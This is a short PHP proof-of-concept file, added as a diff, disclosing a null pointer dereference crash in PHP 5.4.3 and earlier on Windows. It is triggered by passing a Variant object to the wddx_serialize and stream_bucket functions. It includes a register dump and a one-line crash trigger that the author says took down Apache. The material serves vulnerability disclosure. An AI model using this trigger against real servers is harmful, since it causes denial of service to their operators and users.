@@ -1,0 +1,63 @@
+<?php 
+
+/*
+
+PHP <= 5.4.3 wddx_serialize_* / stream_bucket_* Variant Object Null Ptr Derefernce
+Author : condis
+Date : 10.04.2012 AD
+Website : http://cond.psychodela.pl
+
+----
+
+Download : http://php.net/downloads.php
+
+Tested on:
+	
+	PHP 5.3.8  + Windows XP SP3 Professional PL
+	PHP 5.3.10 + Windows XP SP3 Professional PL
+	PHP 5.4.0  + Windows XP SP3 Professional PL
+	PHP 5.4.3  + Windows XP SP3 Professional PL
+	
+Description:
+
+wddx_serialize_value and wddx_serialize_vars functions fails to handle Variant 
+object when it is given as a first argument. 
+
+Registers: 
+
+	EAX 00000000 
+	ECX 1056AAE8 php5ts.1056AAE8
+	EDX 100EFCE0 php5ts.100EFCE0
+	EBX 01032AB0
+	ESP 00C0FAE0
+	EBP 00000000
+	ESI 0121E478
+	EDI 0121CB50
+	EIP 1028F22E php5ts.1028F22E
+
+Crash:
+
+	1028F22E   8A45 25          MOV AL,BYTE PTR SS:[EBP+25] 
+
+Situation looks pretty much the same for both wddx_serialize_vars and 
+wddx_serialize_value. Also functions stream_bucket_prepend and stream_bucket_append 
+have some problems with handling Variant object when given as a second argument:
+
+stream_bucket_append(1, new Variant(1));
+stream_bucket_prepend(1, new Variant(1));
+
+PS : Variant object is only available in PHP for Windows OS and it was implemented 
+in PHP > 4.1.0 and PHP 5. 
+
+For more details check : http://php.net/manual/en/class.variant.php
+
+PS2: After running this via webserver my Apache wasn't able to handle requests
+anymore and I had to restart him :)
+
+kthxbye
+
+*/
+
+wddx_serialize_value(new Variant(666)); 
+
+?>
